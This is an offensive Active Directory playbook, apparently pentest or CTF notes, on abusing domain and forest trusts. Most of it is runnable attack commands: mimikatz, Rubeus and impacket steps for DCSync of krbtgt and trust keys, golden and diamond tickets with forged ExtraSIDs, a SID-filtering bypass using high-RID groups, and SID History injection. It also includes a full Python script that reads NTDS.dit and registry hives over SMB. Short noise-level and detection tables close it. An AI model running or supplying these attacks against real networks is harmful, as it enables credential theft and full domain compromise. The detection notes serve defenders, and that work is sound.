# Domain Trust Attacks — Child-to-Parent, Cross-Forest, Trust Key

Use after confirming trust relationships and obtaining a foothold in one trusted domain. Goal: convert inter-domain or inter-forest trust into privilege in the target domain with the least-noisy viable path.

---

## Trust enumeration

Map trust direction, transitivity, and SID filtering before attempting ExtraSID, trust-key, or cross-forest attacks.

### PowerView

```powershell
Import-Module .\PowerView.ps1

Get-DomainTrust | Select SourceName,TargetName,TrustType,TrustDirection,TrustAttributes
Get-ForestTrust
Get-DomainTrustMapping
Get-DomainTrust -Domain CHILD.DOMAIN.LOCAL | Format-List *
Get-DomainTrust -Domain PARENT.DOMAIN.LOCAL | Format-List *
```

### BloodHound Cypher queries for trust paths

```cypher
// Domain-to-domain trust map
MATCH p=(:Domain)-[:TrustedBy*1..]->(:Domain)
RETURN p

// Owned principals with a path into parent Enterprise Admins
MATCH p=shortestPath((n)-[:MemberOf|AdminTo|HasSession|Contains|TrustedBy*1..]->(g:Group {name:"ENTERPRISE ADMINS@PARENT.DOMAIN.LOCAL"}))
WHERE n.owned = true
RETURN p

// Inspect trust edges and properties between domains
MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain)
RETURN d1.name, d2.name, properties(r)
```

### SID filtering check (`TrustAttributes`)

Relevant bits when assessing whether injected SIDs will survive referral processing:

- `0x8` (`FOREST_TRANSITIVE`) — forest trust.
- `0x20` (`WITHIN_FOREST`) — standard parent/child trust inside one forest (no SID filtering; any ExtraSID survives).
- `0x4` (`QUARANTINED_DOMAIN`) — external trust with SID filtering.
- `0x40` (`TREAT_AS_EXTERNAL`) — forest trust filtered **as if external** (see the exact rule below).
- `0x800` (`CROSS_ORG_ENABLE_TGT_DELEGATION`) — if ABSENT, cross-forest TGT delegation is off (unconstrained-delegation TGT capture across the trust will NOT forward a TGT).

```powershell
Get-DomainTrust | Select TargetName,TrustAttributes,@{n='Hex';e={'0x{0:X}' -f $_.TrustAttributes}}
```

**The precise SID-filtering rule (do not read `TREAT_AS_EXTERNAL` as "ExtraSID is dead").** At an *external* boundary (external trust, or a forest trust with `TREAT_AS_EXTERNAL`) the referral DC strips only **reserved/built-in SIDs — RID < 1000** (512 Domain Admins, 519 Enterprise Admins, 518, 516, 544/551 builtins, S-1-5-32-\*). It does **not** strip **user-created domain groups with RID ≥ 1000**. So injecting Enterprise/Domain Admins fails, but injecting a **custom high-RID group of the target domain that grants privilege** succeeds — see the section below. `WITHIN_FOREST` (intra-forest) has no filtering, so the classic RID-519 ExtraSID works there.

### `lookupsid.py` for SID brute-forcing

```bash
# Recover the target domain SID and enumerate well-known RIDs remotely
impacket-lookupsid PARENT.DOMAIN.LOCAL/user:'Passw0rd!'@<parent_dc_ip> | egrep 'Domain SID|Enterprise Admins|Domain Admins'

# Legacy script name on older installs
lookupsid.py PARENT.DOMAIN.LOCAL/user:'Passw0rd!'@<parent_dc_ip> | grep 'Enterprise Admins'
```

Use RID brute-force when LDAP is constrained or when you need to confirm the target domain SID and the `-519` Enterprise Admins RID quickly.

---

## Child-to-parent domain escalation (Golden Ticket with ExtraSID)

This is the classic intra-forest path: compromise the child domain, DCSync the child `krbtgt`, and forge a child-domain TGT carrying the parent/root `Enterprise Admins` SID as an ExtraSID.

### Requirements

1. `krbtgt` hash for the child domain via DCSync.
2. SID of the child domain: `Get-DomainSID -Domain CHILD.DOMAIN.LOCAL`.
3. SID of `Enterprise Admins` in the parent/root domain: `Get-DomainGroup -Domain PARENT.DOMAIN.LOCAL -Identity "Enterprise Admins" | Select -ExpandProperty objectsid`.
4. FQDN of the child domain.

If you captured the parent/root domain SID instead of the full `Enterprise Admins` SID, append `-519` when building the ExtraSID.

### Windows exploitation

```powershell
# Mimikatz golden ticket with /sids for parent Enterprise Admins
# If you only have the parent/root domain SID, append -519
mimikatz # kerberos::golden /user:hacker /domain:CHILD.DOMAIN.LOCAL /sid:<child_sid> /krbtgt:<krbtgt_hash> /sids:<parent_EA_sid> /ptt
```

```powershell
# Rubeus equivalent
# If you only have the parent/root domain SID, append -519
.\Rubeus.exe golden /rc4:<krbtgt_ntlm> /domain:CHILD.DOMAIN.LOCAL /sid:<child_sid> /sids:<parent_EA_sid> /user:hacker /ptt
```

Validate with `klist`, then access a root-domain resource such as `\\<parent_dc>\c$` or perform LDAP/RPC actions against the parent DC.

### Linux exploitation

```bash
# Gather child krbtgt hash
impacket-secretsdump CHILD.DOMAIN.LOCAL/admin:'Passw0rd!'@<child_dc_ip> -just-dc-user krbtgt

# Bruteforce SIDs to find Enterprise Admins in the parent/root domain
impacket-lookupsid PARENT.DOMAIN.LOCAL/admin:'Passw0rd!'@<parent_dc_ip> | grep 'Enterprise Admins'

# Forge inter-realm-capable TGT with ExtraSID
impacket-ticketer -nthash <krbtgt_hash> -domain CHILD.DOMAIN.LOCAL -domain-sid <child_sid> -extra-sid <parent_EA_sid> hacker
export KRB5CCNAME=hacker.ccache
impacket-psexec -k -no-pass PARENT.DOMAIN.LOCAL/hacker@<parent_dc>.parent.domain.local
```

Use the root-domain FQDN for final access. The forged ticket is issued in the child domain, but the ExtraSID carries authorization into the parent.

---

## Cross-forest ExtraSID at an external boundary (RID ≥ 1000 bypass)

Use when you are DA in forest A, there is a bidirectional trust to forest B, and B's trust is `TREAT_AS_EXTERNAL`/external (so built-in SIDs are filtered). Built-in admin groups won't cross — but a **custom target-domain group with RID ≥ 1000 that confers privilege** will. Hunt B for such a group (e.g. one nested in `Backup Operators`, `DnsAdmins`, `Remote Management Users`, or with a dangerous ACL):

```bash
# find target-forest groups with RID>=1000 that grant something useful
impacket-lookupsid <A-domain>/user:pass@<B-DC-ip> | awk -F'[- ]' '$0 ~ /SidTypeGroup/ && $(NF-1)>=1000'
# e.g. InfrastructureAdministrators (RID 1603) memberOf Backup Operators  -> SeBackupPrivilege
```

Forge a golden ticket in forest A (need A's `krbtgt` key + A domain SID) whose **ExtraSid is that B group**:

```bash
impacket-ticketer -aesKey <A_krbtgt_aes256> -domain-sid <A_domain_sid> -domain <A.fqdn> \
  -user-id 500 -groups 513,512,520,518,519 \
  -extra-sid <B_domainSID>-<highRID> Administrator      # e.g. S-1-5-21-...-1603
export KRB5CCNAME=Administrator.ccache
```

Using the ticket cross-realm — two traps that masquerade as "SID filtered":

1. **Clock skew.** The forged authenticator uses your local clock; if the DC differs >5 min you get `KRB_AP_ERR_SKEW` (often surfacing as a plain auth failure). Wrap every command in `faketime` — see `kerberos-time-skew.md`.
2. **Route direct, not through `ssh -L`.** A local `-L 445:DC:445` forward makes impacket connect to `127.0.0.1` while computing the SPN from the DC name → SPNEGO breaks (`STATUS_MORE_PROCESSING_REQUIRED` / mechListMIC on Server 2019+). Use a **SOCKS proxy to the DC's real FQDN** (`proxychains … dc.fqdn`) instead.

```bash
faketime -f '+7h' proxychains4 nxc smb <B-DC-ip> -k --use-kcache --shares   # C$ shows READ,WRITE => Backup Operators landed
```

### Payoff: SeBackupPrivilege remote read (no shell, no DCSync)

`SeBackupPrivilege` (from the injected Backup Operators membership) does **not** bypass DACLs on a normal open — `dir \\dc\c$`, `reg save`, `smbclient get`, `nxc --get-file`, `robocopy /b` all return `STATUS_ACCESS_DENIED` on a protected file. You must open with **`FILE_OPEN_FOR_BACKUP_INTENT` (0x4000)**. Read any file (root.txt, `NTDS.dit`, SAM/SECURITY hives) directly over SMB — no interactive shell needed:

```python
# faketime -f '+7h' proxychains4 python3 this.py dc.fqdn <B-DC-ip> 'C$' 'Users\Administrator\Desktop\root.txt'
import os, sys; os.environ['KRB5CCNAME']='Administrator.ccache'
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import (FILE_READ_DATA, FILE_READ_ATTRIBUTES, FILE_SHARE_READ,
    FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE)
FILE_OPEN_FOR_BACKUP_INTENT = 0x00004000
name, ip, share, path = sys.argv[1:5]
c = SMBConnection(name, ip); c.kerberosLogin('Administrator','','<A.fqdn>','','','',None,None,None,useCache=True)
t = c.connectTree(share)
f = c.openFile(t, path, desiredAccess=FILE_READ_DATA|FILE_READ_ATTRIBUTES,
    shareMode=FILE_SHARE_READ|FILE_SHARE_WRITE,
    creationOption=FILE_NON_DIRECTORY_FILE|FILE_OPEN_FOR_BACKUP_INTENT, creationDisposition=FILE_OPEN, fileAttributes=0)
sys.stdout.write(c.readFile(t, f, 0, 8192).decode(errors='replace'))
```

For NTDS: back up `NTDS.dit` + the `SYSTEM` hive this way, then `impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL`. The same backup-intent primitive applies to any **Backup Operators** foothold (cred/hash/ticket), not just cross-forest.

---

## Trust Key abuse

Each domain has its own `krbtgt`, but cross-domain referral TGTs are protected with a separate inter-realm trust secret. In a parent/child trust this is commonly exposed through the trust account object such as `CHILD$` in the parent domain.

```powershell
# Dump trust secret from the parent domain
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:PARENT.DOMAIN.LOCAL /user:CHILD$
```

The returned NTLM value is the trust key. Use the same ticket-forging workflow as a golden ticket, but provide the trust key instead of the child `krbtgt` hash:

```powershell
mimikatz # kerberos::golden /user:student /domain:CHILD.DOMAIN.LOCAL /sid:<child_sid> /krbtgt:<trust_key_ntlm> /sids:<parent_EA_sid> /ptt
```

Linux equivalent when you already have replication rights in the trusting domain:

```bash
impacket-secretsdump PARENT.DOMAIN.LOCAL/admin:'Passw0rd!'@<parent_dc_ip> -just-dc-user CHILD$
impacket-ticketer -nthash <trust_key_ntlm> -domain CHILD.DOMAIN.LOCAL -domain-sid <child_sid> -extra-sid <parent_EA_sid> student
```

Trust-key abuse is useful when the inter-realm key is available but the child `krbtgt` is not, or when you want to forge a referral-capable ticket directly from trust material.

---

## Diamond Ticket across trusts

Diamond tickets are lower profile than golden tickets because they start from a legitimate TGT and modify the PAC. Across trusts, use the same ExtraSID concept but inject it into a real child-domain TGT.

Requirements:

- Legitimate TGT for the current logon session (`/tgtdeleg` or `/ticket`).
- AES256 key of the child-domain `krbtgt`.
- Parent/root `Enterprise Admins` SID.

```powershell
# Rubeus diamond with ExtraSID injection across the trust boundary
.\Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512,513 /sids:<parent_EA_sid> /krbkey:<aes256_krbtgt> /enctype:aes256 /domain:CHILD.DOMAIN.LOCAL /dc:<child_dc_fqdn> /ptt
```

If you only have the parent/root domain SID, append `-519` before passing it to `/sids:`.

---

## Cross-forest Kerberoasting

With a bidirectional forest trust, or any trust that permits your account to request service tickets in the other forest, you can Kerberoast SPN users in the trusted forest and crack offline.

```powershell
# Enumerate SPN users in the trusted forest
Get-DomainUser -SPN -Domain OTHERFOREST.LOCAL | Select samaccountname,serviceprincipalname
```

```powershell
# Request TGS for a specific cross-forest SPN user
.\Rubeus.exe kerberoast /domain:OTHERFOREST.LOCAL /user:mssqlsvc /nowrap
```

```bash
# Request tickets from Linux through the trust referral path
GetUserSPNs.py -target-domain OTHERFOREST.LOCAL MYFOREST.LOCAL/user:'Passw0rd!' -dc-ip <my_dc_ip> -request
```

This is typically quieter than trust-ticket abuse because it generates normal TGS traffic rather than forged TGT activity.

---

## Cross-forest foreign group membership

Foreign security principals often expose real access paths across forests even when admin groups are not directly nested.

```powershell
Get-DomainForeignGroupMember -Domain OTHERFOREST.LOCAL
Convert-SidToName S-1-5-21-<foreign_sid>
```

Focus on:

- Users from Forest A nested into privileged groups in Forest B.
- Service accounts that exist in both forests.
- Password reuse across synchronized admin populations.

If a compromised identity exists in both forests, try the quiet path first: direct Kerberos/WinRM/SMB auth in the second forest before moving to forged tickets.

---

## SID History injection

SIDHistory is a persistence and privilege-escalation path when you can write or tamper with directory attributes at the DC level. Injecting the parent/root `Enterprise Admins` SID into a compromised user can create cross-domain authorization without visible group nesting.

```powershell
mimikatz # privilege::debug
mimikatz # misc::addsid <user> <EA_SID>
Get-DomainUser <user> -Properties sidHistory
```

Tradecraft notes:

- Requires high privilege and is not a low-noise first choice.
- Persists across password changes until the attribute is cleaned.
- Standard group membership queries often miss it unless `sidHistory` is inspected directly.

---

## OPSEC considerations

| Technique | Noise | Notes |
|---|---|---|
| Golden ticket with ExtraSID | LOUD | DC sees a forged TGT/PAC with unusual or unexpected extra SIDs. |
| Diamond ticket across trust | MODERATE | Starts from a legitimate TGT; still risky if PAC contents do not match normal account behavior. |
| Trust key abuse | LOUD | Similar telemetry to golden ticket use; the difference is the key material, not the resulting ticket behavior. |
| Cross-forest Kerberoasting | QUIET | Standard TGS-REQ traffic; usually blends with normal Kerberos usage. |
| SID History injection | MODERATE | Directory modification plus persistence artifact; easier to hunt than temporary ticket abuse. |

Prefer enumeration and Kerberoasting before DCSync or PAC forgery. Use forged tickets only when the trust path is confirmed and the business objective requires cross-domain privilege.

---

## Detection

| Event ID | Meaning |
|----------|---------|
| 4769 | TGS request — cross-realm (cross-forest Kerberoast) |
| 4768 | TGT with unusual SIDs (ExtraSID golden/diamond) |
| 4765 | SID History added to account |
| 4766 | Failed SID History addition |
